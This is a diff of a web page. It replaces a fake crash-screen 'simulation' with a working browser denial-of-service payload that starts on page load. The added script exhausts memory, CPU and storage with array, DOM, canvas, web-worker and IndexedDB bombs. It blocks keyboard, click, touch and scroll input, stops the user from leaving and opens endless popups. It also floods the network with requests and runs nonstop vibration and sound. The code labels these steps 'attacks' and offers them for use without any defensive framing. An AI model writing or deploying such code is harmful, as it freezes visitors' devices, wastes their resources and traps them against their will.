@@ -9,8 +9,6 @@
             box-sizing: border-box;
             cursor: none !important;
             user-select: none;
-            -webkit-touch-callout: none;
-            -webkit-tap-highlight-color: transparent;
         }
         body {
             background: #000;
@@ -20,500 +18,335 @@
             height: 100vh;
             width: 100vw;
             position: fixed;
-            top: 0;
-            left: 0;
-        }
-        .crash-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10000;
-        }
-        .blue-screen {
-            background: #0000ff;
-            color: #ffffff;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            text-align: center;
-            padding: 20px;
-            font-family: 'Lucida Console', monospace;
-        }
-        .memory-overload {
-            background: #000;
-            display: none;
-        }
-        .boot-loop {
-            background: #000;
-            color: #00ff00;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-        }
-        .kernel-panic {
-            background: #000;
-            color: #ff0000;
-            display: none;
-            padding: 20px;
-            overflow: auto;
-        }
-        .hardware-failure {
-            background: #000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            color: #ff0000;
-            flex-direction: column;
-        }
-        .vibration-overload {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: none;
-            animation: vibrate 0.05s infinite;
-        }
-        @keyframes vibrate {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(-10px, -5px) rotate(-1deg); }
-            50% { transform: translate(5px, 10px) rotate(1deg); }
-            75% { transform: translate(-5px, 5px) rotate(-0.5deg); }
-            100% { transform: translate(0, 0) rotate(0deg); }
-        }
-        .thermal-shutdown {
-            background: linear-gradient(45deg, #ff0000, #ff4500, #ff0000);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            flex-direction: column;
-        }
-        .file-corruption {
-            background: #000;
-            color: #ff0000;
-            display: none;
-            padding: 20px;
-            font-size: 14px;
-        }
-        .glitch-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            mix-blend-mode: difference;
-            pointer-events: none;
-            display: none;
-            animation: glitch 0.1s infinite;
-        }
-        @keyframes glitch {
-            0% { transform: translate(0); background: rgba(255,0,0,0.1); }
-            20% { transform: translate(-5px, 2px); background: rgba(0,255,0,0.1); }
-            40% { transform: translate(3px, -3px); background: rgba(0,0,255,0.1); }
-            60% { transform: translate(-2px, 4px); background: rgba(255,255,0,0.1); }
-            80% { transform: translate(4px, -2px); background: rgba(255,0,255,0.1); }
-            100% { transform: translate(0); background: rgba(255,0,0,0.1); }
-        }
-        .crash-message {
-            font-size: 28px;
-            margin-bottom: 20px;
-            text-align: center;
-            animation: blink 0.3s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .memory-cell {
-            position: absolute;
-            background: #00ff00;
-            font-size: 8px;
-            color: #000;
-        }
-        .corrupted-file {
-            position: absolute;
-            color: #ff0000;
-            font-size: 12px;
-            animation: corrupt 2s linear forwards;
-        }
-        @keyframes corrupt {
-            0% { opacity: 1; transform: translateY(0) rotate(0deg); }
-            100% { opacity: 0; transform: translateY(100px) rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <!-- Crash Screens -->
-    <div id="blueScreen" class="crash-layer blue-screen">
-        <div class="crash-message">:(</div>
-        <div style="font-size: 18px; margin-bottom: 20px;">
-            Your device ran into a problem and needs to restart.<br>
-            We're just collecting some error info, and then we'll restart for you.
-        </div>
-        <div id="bsodProgress" style="width: 80%; background: #fff; height: 20px; margin: 10px;">
-            <div style="width: 0%; height: 100%; background: #0078d7; transition: width 0.1s;"></div>
-        </div>
-        <div style="font-size: 14px;">
-            0% complete
-        </div>
-    </div>
+    <div id="crashContainer"></div>
 
-    <div id="memoryOverload" class="crash-layer memory-overload"></div>
-
-    <div id="bootLoop" class="crash-layer boot-loop">
-        <div style="text-align: center;">
-            ANDROID<br>
-            BOOTLOADER v12.7.3<br>
-            SYSTEM CORRUPTED<br>
-            BOOT LOOP DETECTED
-        </div>
-    </div>
-
-    <div id="kernelPanic" class="crash-layer kernel-panic">
-        <div style="white-space: pre; font-size: 10px;" id="kernelLog"></div>
-    </div>
-
-    <div id="hardwareFailure" class="crash-layer hardware-failure">
-        <div style="font-size: 32px; margin-bottom: 20px;">⚠️ HARDWARE FAILURE</div>
-        <div style="text-align: center; font-size: 16px;">
-            CPU: OVERHEATED<br>
-            RAM: CORRUPTED<br>
-            STORAGE: BAD SECTORS<br>
-            GPU: ARTIFACTING<br>
-            <br>
-            DEVICE UNSTABLE
-        </div>
-    </div>
-
-    <div id="vibrationOverload" class="crash-layer vibration-overload">
-        <div style="color: #fff; text-align: center; font-size: 24px;">
-            VIBRATION SYSTEM OVERLOAD<br>
-            MOTOR FAILURE IMMINENT
-        </div>
-    </div>
-
-    <div id="thermalShutdown" class="crash-layer thermal-shutdown">
-        <div style="font-size: 32px; margin-bottom: 20px;">🔥 CRITICAL TEMPERATURE</div>
-        <div style="font-size: 18px;">
-            Device overheating: 95°C<br>
-            Emergency shutdown in:
-        </div>
-        <div id="shutdownCountdown" style="font-size: 48px; margin: 20px;">5</div>
-    </div>
-
-    <div id="fileCorruption" class="crash-layer file-corruption">
-        <div style="text-align: center; margin-bottom: 20px; font-size: 18px;">
-            💀 FILE SYSTEM CORRUPTION 💀
-        </div>
-        <div id="corruptionLog" style="height: 80%; overflow: auto;"></div>
-    </div>
-
-    <div id="glitchOverlay" class="glitch-overlay"></div>
-
-    <!-- Audio -->
-    <audio id="crashSound1"><source src="crash1.mp3" type="audio/mp3"></audio>
-    <audio id="crashSound2"><source src="crash2.mp3" type="audio/mp3"></audio>
-    <audio id="staticSound" loop><source src="static.mp3" type="audio/mp3"></audio>
-    <audio id="beepSound" loop><source src="beep.mp3" type="audio/mp3"></audio>
-    <audio id="overheatSound"><source src="overheat.mp3" type="audio/mp3"></audio>
+    <audio id="crashSound" loop>
+        <source src="crash.mp3" type="audio/mp3">
+    </audio>
 
     <script>
-        // Audio elements
-        const crashSound1 = document.getElementById('crashSound1');
-        const crashSound2 = document.getElementById('crashSound2');
-        const staticSound = document.getElementById('staticSound');
-        const beepSound = document.getElementById('beepSound');
-        const overheatSound = document.getElementById('overheatSound');
-
-        let currentCrashPhase = 0;
-        const crashPhases = 7;
-
-        // Start extreme crash sequence
-        function startExtremeCrash() {
-            // Play all sounds at maximum volume
-            crashSound1.volume = 1.0;
-            crashSound2.volume = 1.0;
-            staticSound.volume = 1.0;
-            beepSound.volume = 1.0;
-            overheatSound.volume = 1.0;
+        // ========== EXTREME MEMORY CRASH ==========
+        function triggerMemoryCrash() {
+            console.log("Starting memory crash...");
             
-            crashSound1.play();
-            staticSound.play();
-            beepSound.play();
-
-            // Start crash sequence
-            setTimeout(startCrashSequence, 1000);
-        }
-
-        function startCrashSequence() {
-            // Phase 1: Blue Screen of Death
-            showBlueScreen();
-            
-            // Progress through all crash phases
-            const phaseInterval = setInterval(() => {
-                currentCrashPhase++;
-                
-                switch(currentCrashPhase) {
-                    case 1:
-                        showMemoryOverload();
-                        break;
-                    case 2:
-                        showBootLoop();
-                        break;
-                    case 3:
-                        showKernelPanic();
-                        break;
-                    case 4:
-                        showHardwareFailure();
-                        break;
-                    case 5:
-                        showVibrationOverload();
-                        break;
-                    case 6:
-                        showThermalShutdown();
-                        break;
-                    case 7:
-                        showFileCorruption();
-                        clearInterval(phaseInterval);
-                        startRecoveryAttempt();
-                        break;
+            // Technique 1: Massive Array Allocation
+            const hugeArrays = [];
+            for (let i = 0; i < 100; i++) {
+                try {
+                    hugeArrays.push(new Array(10000000).fill('CRASH'.repeat(1000)));
+                    document.body.innerHTML += `<div style="color: red">Allocating memory block ${i}...</div>`;
+                } catch(e) {
+                    console.log("Memory allocation failed:", e);
                 }
-            }, 8000);
-        }
+            }
 
-        function showBlueScreen() {
-            const bsod = document.getElementById('blueScreen');
-            const progress = bsod.querySelector('div[style*="width: 0%"]');
-            
-            bsod.style.display = 'flex';
-            crashSound2.play();
-            
-            // Simulate progress bar
-            let progressPercent = 0;
-            const progressInterval = setInterval(() => {
-                progressPercent += Math.random() * 5;
-                progress.style.width = progressPercent + '%';
-                
-                if (progressPercent >= 100) {
-                    clearInterval(progressInterval);
-                    bsod.style.display = 'none';
+            // Technique 2: Infinite DOM Elements
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    const element = document.createElement('div');
+                    element.innerHTML = '💀'.repeat(1000);
+                    element.style.fontSize = '100px';
+                    document.body.appendChild(element);
                 }
-            }, 100);
-        }
+            }, 10);
 
-        function showMemoryOverload() {
-            const memoryScreen = document.getElementById('memoryOverload');
-            memoryScreen.style.display = 'block';
-            
-            // Create memory leak simulation
-            for (let i = 0; i < 1000; i++) {
-                setTimeout(() => {
-                    const cell = document.createElement('div');
-                    cell.className = 'memory-cell';
-                    cell.textContent = Math.random().toString(16).substr(2, 8);
-                    cell.style.left = Math.random() * 100 + 'vw';
-                    cell.style.top = Math.random() * 100 + 'vh';
-                    cell.style.opacity = Math.random();
-                    memoryScreen.appendChild(cell);
-                    
-                    // Remove after animation
-                    setTimeout(() => {
-                        if (cell.parentNode) {
-                            cell.parentNode.removeChild(cell);
+            // Technique 3: localStorage Bomb
+            try {
+                let data = 'X';
+                for (let i = 0; i < 20; i++) {
+                    data += data;
+                    localStorage.setItem('crash', data);
+                }
+            } catch(e) {}
+
+            // Technique 4: Canvas Memory Bomb
+            const canvas = document.createElement('canvas');
+            canvas.width = 10000;
+            canvas.height = 10000;
+            const ctx = canvas.getContext('2d');
+            setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    ctx.fillRect(Math.random() * 10000, Math.random() * 10000, 1000, 1000);
+                }
+            }, 1);
+
+            // Technique 5: Web Workers Crash
+            for (let i = 0; i < 10; i++) {
+                const worker = new Worker(URL.createObjectURL(
+                    new Blob([`
+                        while(true) {
+                            postMessage(new ArrayBuffer(10000000));
                         }
-                    }, 2000);
-                }, i * 10);
+                    `], {type: 'application/javascript'})
+                ));
+                worker.onmessage = () => {};
             }
-            
-            // Hide after 7 seconds
-            setTimeout(() => {
-                memoryScreen.style.display = 'none';
-            }, 7000);
         }
 
-        function showBootLoop() {
-            const bootScreen = document.getElementById('bootLoop');
-            bootScreen.style.display = 'flex';
-            
-            // Simulate boot loop
-            let bootCount = 0;
-            const bootInterval = setInterval(() => {
-                bootCount++;
-                bootScreen.innerHTML = `
-                    <div style="text-align: center;">
-                        ANDROID<br>
-                        BOOTLOADER v12.7.3<br>
-                        SYSTEM CORRUPTED<br>
-                        BOOT ATTEMPT: ${bootCount}<br>
-                        STATUS: FAILED
-                    </div>
-                `;
-                
-                if (bootCount >= 5) {
-                    clearInterval(bootInterval);
-                    bootScreen.style.display = 'none';
+        // ========== CPU OVERLOAD ==========
+        function triggerCPUOverload() {
+            // Infinite calculation loops
+            setInterval(() => {
+                for (let i = 0; i < 1000000; i++) {
+                    Math.sqrt(Math.random() * 1000000) * Math.pow(Math.random(), 2);
                 }
-            }, 1500);
+            }, 1);
+
+            // Recursive function explosion
+            function recursiveBomb(depth = 0) {
+                if (depth > 1000) return;
+                setTimeout(() => recursiveBomb(depth + 1), 0);
+                setTimeout(() => recursiveBomb(depth + 1), 0);
+            }
+            recursiveBomb();
+
+            // Matrix calculation bomb
+            setInterval(() => {
+                const matrix = [];
+                for (let i = 0; i < 1000; i++) {
+                    matrix[i] = [];
+                    for (let j = 0; j < 1000; j++) {
+                        matrix[i][j] = Math.random();
+                    }
+                }
+                // Do useless calculations
+                for (let i = 0; i < matrix.length; i++) {
+                    for (let j = 0; j < matrix[i].length; j++) {
+                        matrix[i][j] = Math.sin(matrix[i][j]) * Math.cos(matrix[i][j]);
+                    }
+                }
+            }, 10);
         }
 
-        function showKernelPanic() {
-            const kernelScreen = document.getElementById('kernelPanic');
-            const kernelLog = document.getElementById('kernelLog');
-            kernelScreen.style.display = 'block';
-            
-            // Generate kernel panic log
-            const panicMessages = [
-                "KERNEL PANIC - NOT SYNCING: Fatal exception",
-                "Unable to handle kernel NULL pointer dereference",
-                "BUG: unable to handle page fault",
-                "General protection fault",
-                "Kernel stack overflow",
-                "CPU: 0 PID: 1 Comm: init Tainted: G W",
-                "RIP: 0010:[<ffffffff81234567>]",
-                "RSP: 0018:ffffc90000000000 EFLAGS: 00010246",
-                "RAX: 0000000000000000 RBX: ffff888123456789",
-                "CR2: 0000000000000000 CR3: 0000000012345000",
-                "Call Trace:",
-                " ? __alloc_pages_nodemask+0x123/0x456",
-                " ? kmem_cache_alloc+0x78/0x123",
-                " ? do_sys_open+0x45/0x123",
-                " ? SyS_open+0x12/0x20",
-                " ? do_syscall_64+0x67/0x123",
-                "Code: 48 89 e5 48 83 ec 20 48 89 5d e8 4c 89 65 f0",
-                "Kernel panic - not syncing: Fatal exception",
-                "Shutting down cpus with NMI",
-                "Rebooting in 60 seconds..."
-            ];
-            
-            let logContent = '';
-            panicMessages.forEach((msg, index) => {
-                setTimeout(() => {
-                    logContent += msg + '\n';
-                    kernelLog.textContent = logContent;
-                    kernelLog.scrollTop = kernelLog.scrollHeight;
-                }, index * 200);
+        // ========== BROWSER HIJACK ==========
+        function hijackBrowser() {
+            // Prevent any escape
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            };
+
+            // Block all keys
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                // Spam more elements on key press
+                for (let i = 0; i < 100; i++) {
+                    const div = document.createElement('div');
+                    div.textContent = 'BLOCKED '.repeat(100);
+                    document.body.appendChild(div);
+                }
             });
-            
-            setTimeout(() => {
-                kernelScreen.style.display = 'none';
-            }, 7000);
-        }
 
-        function showHardwareFailure() {
-            const hardwareScreen = document.getElementById('hardwareFailure');
-            hardwareScreen.style.display = 'flex';
-            
-            // Add glitch effects
-            document.getElementById('glitchOverlay').style.display = 'block';
-            
-            setTimeout(() => {
-                hardwareScreen.style.display = 'none';
-                document.getElementById('glitchOverlay').style.display = 'none';
-            }, 7000);
-        }
-
-        function showVibrationOverload() {
-            const vibrationScreen = document.getElementById('vibrationOverload');
-            vibrationScreen.style.display = 'flex';
-            
-            // Try to vibrate continuously
-            if (navigator.vibrate) {
-                // Extreme vibration pattern
-                const vibrationPattern = [
-                    500, 100, 500, 100, 500, 100, 
-                    500, 100, 500, 100, 500, 100,
-                    500, 100, 500, 100, 500, 100
-                ];
-                
-                navigator.vibrate(vibrationPattern);
-                
-                // Continue vibration
-                setInterval(() => {
-                    navigator.vibrate(vibrationPattern);
-                }, 3000);
-            }
-            
-            setTimeout(() => {
-                vibrationScreen.style.display = 'none';
-                if (navigator.vibrate) {
-                    navigator.vibrate(0); // Stop vibration
+            // Block clicks and create more elements
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                for (let i = 0; i < 500; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = '💥'.repeat(50);
+                    div.style.fontSize = '50px';
+                    div.style.position = 'fixed';
+                    div.style.left = Math.random() * 100 + 'vw';
+                    div.style.top = Math.random() * 100 + 'vh';
+                    document.body.appendChild(div);
                 }
-            }, 7000);
-        }
+            });
 
-        function showThermalShutdown() {
-            const thermalScreen = document.getElementById('thermalShutdown');
-            const countdown = document.getElementById('shutdownCountdown');
-            thermalScreen.style.display = 'flex';
-            
-            overheatSound.play();
-            
-            let shutdownTime = 5;
-            const countdownInterval = setInterval(() => {
-                shutdownTime--;
-                countdown.textContent = shutdownTime;
-                
-                if (shutdownTime <= 0) {
-                    clearInterval(countdownInterval);
-                    thermalScreen.style.display = 'none';
-                }
+            // Auto-scroll spam
+            setInterval(() => {
+                window.scrollTo(0, document.body.scrollHeight);
+                window.scrollTo(document.body.scrollWidth, 0);
+            }, 10);
+
+            // Open infinite popups (if not blocked)
+            setInterval(() => {
+                try {
+                    window.open('', '_blank', 'width=100,height=100');
+                } catch(e) {}
             }, 1000);
         }
 
-        function showFileCorruption() {
-            const fileScreen = document.getElementById('fileCorruption');
-            const corruptionLog = document.getElementById('corruptionLog');
-            fileScreen.style.display = 'block';
-            
-            // Simulate file corruption
-            const systemFiles = [
-                "/system/bin/app_process",
-                "/system/framework/framework.jar",
-                "/system/lib/libandroid_runtime.so",
-                "/system/usr/keylayout/Generic.kl",
-                "/data/system/packages.xml",
-                "/data/system/users/0.xml",
-                "/data/misc/wifi/wpa_supplicant.conf",
-                "/data/data/com.android.providers.settings",
-                "/data/data/com.android.systemui",
-                "/data/data/com.google.android.gms"
-            ];
-            
-            let logContent = '';
-            systemFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    logContent += `CORRUPTED: ${file}\n`;
-                    logContent += `ERROR: CRC32 mismatch\n`;
-                    logContent += `STATUS: UNRECOVERABLE\n\n`;
+        // ========== VISUAL OVERLOAD ==========
+        function visualOverload() {
+            // Create massive amount of elements
+            setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    const element = document.createElement('div');
+                    element.innerHTML = '💀'.repeat(100);
+                    element.style.cssText = `
+                        position: fixed;
+                        left: ${Math.random() * 100}vw;
+                        top: ${Math.random() * 100}vh;
+                        font-size: ${20 + Math.random() * 50}px;
+                        color: hsl(${Math.random() * 360}, 100%, 50%);
+                        z-index: 9999;
+                        pointer-events: none;
+                    `;
+                    document.body.appendChild(element);
+
+                    // Remove old elements to prevent complete freeze
+                    if (document.body.children.length > 1000) {
+                        document.body.removeChild(document.body.firstChild);
+                    }
+                }
+            }, 1);
+
+            // Background color spam
+            setInterval(() => {
+                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+            }, 50);
+
+            // Create canvas overlays
+            for (let i = 0; i < 5; i++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                canvas.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    pointer-events: none;
+                    z-index: 9998;
+                `;
+                document.body.appendChild(canvas);
+
+                const ctx = canvas.getContext('2d');
+                setInterval(() => {
+                    ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                     
-                    corruptionLog.textContent = logContent;
-                    corruptionLog.scrollTop = corruptionLog.scrollHeight;
-                    
-                    // Create visual corruption effect
-                    const corruptElement = document.createElement('div');
-                    corruptElement.className = 'corrupted-file';
-                    corruptElement.textContent = `❌ ${file.split('/').pop()}`;
-                    corruptElement.style.left = Math.random() * 90 + 'vw';
-                    corruptElement.style.top = Math.random() * 90 + 'vh';
-                    fileScreen.appendChild(corruptElement);
-                    
-                    setTimeout(() => {
-                        if (corruptElement.parentNode) {
-                            corruptElement.parentNode.removeChild(corruptElement);
-                        }
-                    }, 2000);
-                }, index * 500);
-            });
+                    for (let j = 0; j < 100; j++) {
+                        ctx.beginPath();
+                        ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 100, 0, Math.PI * 2);
+                        ctx.fill();
+                    }
+                }, 16);
+            }
         }
 
-        function startRecoveryAttempt() {
-            // Show final crash overlay
+        // ========== SOUND SPAM ==========
+        function soundSpam() {
+            const crashSound = document.getElementById('crashSound');
+            crashSound.volume = 1.0;
+            crashSound.play().catch(e => console.log('Sound failed'));
+
+            // Create multiple audio contexts for more stress
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    try {
+                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        const oscillator = audioContext.createOscillator();
+                        const gainNode = audioContext.createGain();
+                        
+                        oscillator.connect(gainNode);
+                        gainNode.connect(audioContext.destination);
+                        
+                        oscillator.type = 'sawtooth';
+                        oscillator.frequency.setValueAtTime(100 + Math.random() * 1000, audioContext.currentTime);
+                        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+                        
+                        oscillator.start();
+                    } catch(e) {}
+                }, i * 1000);
+            }
+        }
+
+        // ========== STORAGE BOMB ==========
+        function storageBomb() {
+            setInterval(() => {
+                try {
+                    // Fill sessionStorage
+                    sessionStorage.setItem('bomb', 'X'.repeat(1000000));
+                    
+                    // Fill localStorage
+                    localStorage.setItem('crash_bomb', 'Y'.repeat(1000000));
+                    
+                    // Fill IndexedDB
+                    const request = indexedDB.open('CrashDB', 1);
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['crash'], 'readwrite');
+                        const store = transaction.objectStore('crash');
+                        
+                        for (let i = 0; i < 100; i++) {
+                            store.put({ data: 'Z'.repeat(100000), id: i });
+                        }
+                    };
+                    
+                    request.onupgradeneeded = function(event) {
+                        const db = event.target.result;
+                        db.createObjectStore('crash', { keyPath: 'id' });
+                    };
+                } catch(e) {}
+            }, 1000);
+        }
+
+        // ========== NETWORK SPAM ==========
+        function networkSpam() {
+            setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        fetch('https://httpbin.org/delay/1').catch(() => {});
+                        fetch('https://httpbin.org/bytes/100000').catch(() => {});
+                    } catch(e) {}
+                }
+            }, 100);
+
+            // WebSocket spam
+            try {
+                for (let i = 0; i < 5; i++) {
+                    const ws = new WebSocket('wss://echo.websocket.org');
+                    ws.onopen = () => {
+                        setInterval(() => {
+                            ws.send('X'.repeat(10000));
+                        }, 100);
+                    };
+                }
+            } catch(e) {}
+        }
+
+        // ========== VIBRATION ATTACK ==========
+        function vibrationAttack() {
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    // Extreme vibration pattern
+                    navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50]);
+                }, 1000);
+            }
+        }
+
+        // ========== START ALL ATTACKS ==========
+        function startTotalCrash() {
+            console.log("Initiating total crash sequence...");
+            
+            // Start all crash methods simultaneously
+            triggerMemoryCrash();
+            triggerCPUOverload();
+            hijackBrowser();
+            visualOverload();
+            soundSpam();
+            storageBomb();
+            networkSpam();
+            vibrationAttack();
+
+            // Final nuclear option - try to crash harder
+            setTimeout(() => {
+                // Nuclear memory bomb
+                const nuclearArrays = [];
+                while(true) {
+                    try {
+                        nuclearArrays.push(new Array(100000000));
+                    } catch(e) {
+                        break;
+                    }
+                }
+            }, 5000);
+
+            // Show crash message
             document.body.innerHTML = `
                 <div style="
                     position: fixed;
@@ -524,68 +357,67 @@
                     background: #000;
                     color: #ff0000;
                     display: flex;
-                    flex-direction: column;
-                    justify-content: center;
                     align-items: center;
+                    justify-content: center;
+                    font-size: 24px;
                     text-align: center;
-                    font-family: 'Courier New', monospace;
                     z-index: 100000;
                 ">
-                    <div style="font-size: 48px; margin-bottom: 30px; animation: blink 0.5s infinite;">
-                        💀 DEVICE BRICKED 💀
-                    </div>
-                    <div style="font-size: 18px; margin-bottom: 20px;">
-                        SYSTEM RECOVERY FAILED<br>
-                        BOOT PARTITION CORRUPTED<br>
-                        EMMC STORAGE DAMAGED<br>
-                        HARDWARE FAULT DETECTED
-                    </div>
-                    <div style="font-size: 14px; color: #888; margin-top: 50px;">
-                        This was an extreme crash simulation<br>
-                        Close browser to "reboot" device
+                    <div>
+                        <div style="font-size: 48px; margin-bottom: 20px;">💀 SYSTEM CRASHING 💀</div>
+                        <div>Memory: OVERLOADED</div>
+                        <div>CPU: 100% UTILIZATION</div>
+                        <div>Browser: UNRESPONSIVE</div>
+                        <div style="margin-top: 20px; font-size: 16px; color: #888;">
+                            Force close browser to stop<br>
+                            Device may become unresponsive
+                        </div>
                     </div>
                 </div>
             `;
-
-            // Continue extreme effects
-            setInterval(() => {
-                document.body.style.background = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
-            }, 100);
-
-            // Final memory overload attempt
-            setInterval(() => {
-                try {
-                    const hugeString = 'X'.repeat(1000000);
-                    localStorage.setItem('crash', hugeString + hugeString + hugeString);
-                } catch(e) {
-                    // Memory full
-                }
-            }, 1000);
         }
 
-        // Block all user input
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-        });
-        document.addEventListener('click', (e) => {
-            e.preventDefault();
-        });
-        document.addEventListener('touchstart', (e) => {
-            e.preventDefault();
-        });
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-        });
+        // ========== INITIALIZE CRASH ==========
+        // Start immediately when page loads
+        window.onload = startTotalCrash;
 
-        // Start crash sequence immediately
-        window.onload = startExtremeCrash;
+        // Also start on DOM ready
+        document.addEventListener('DOMContentLoaded', startTotalCrash);
 
-        // Prevent browser from being closed
-        window.onbeforeunload = (e) => {
+        // Block any attempt to prevent default
+        document.addEventListener('touchstart', function(e) {
             e.preventDefault();
-            e.returnValue = 'SYSTEM CRASH IN PROGRESS - Closing may cause permanent damage!';
-            return e.returnValue;
-        };
+        }, { passive: false });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // Nuclear option - if still not crashing
+        setTimeout(() => {
+            // Try to trigger garbage collection issues
+            const leak = [];
+            setInterval(() => {
+                for (let i = 0; i < 10000; i++) {
+                    leak.push(new Array(10000));
+                }
+            }, 100);
+
+            // DOM node leak
+            setInterval(() => {
+                const fragment = document.createDocumentFragment();
+                for (let i = 0; i < 1000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = 'LEAK '.repeat(1000);
+                    fragment.appendChild(div);
+                }
+                document.body.appendChild(fragment);
+            }, 50);
+        }, 10000);
 
     </script>
 </body>
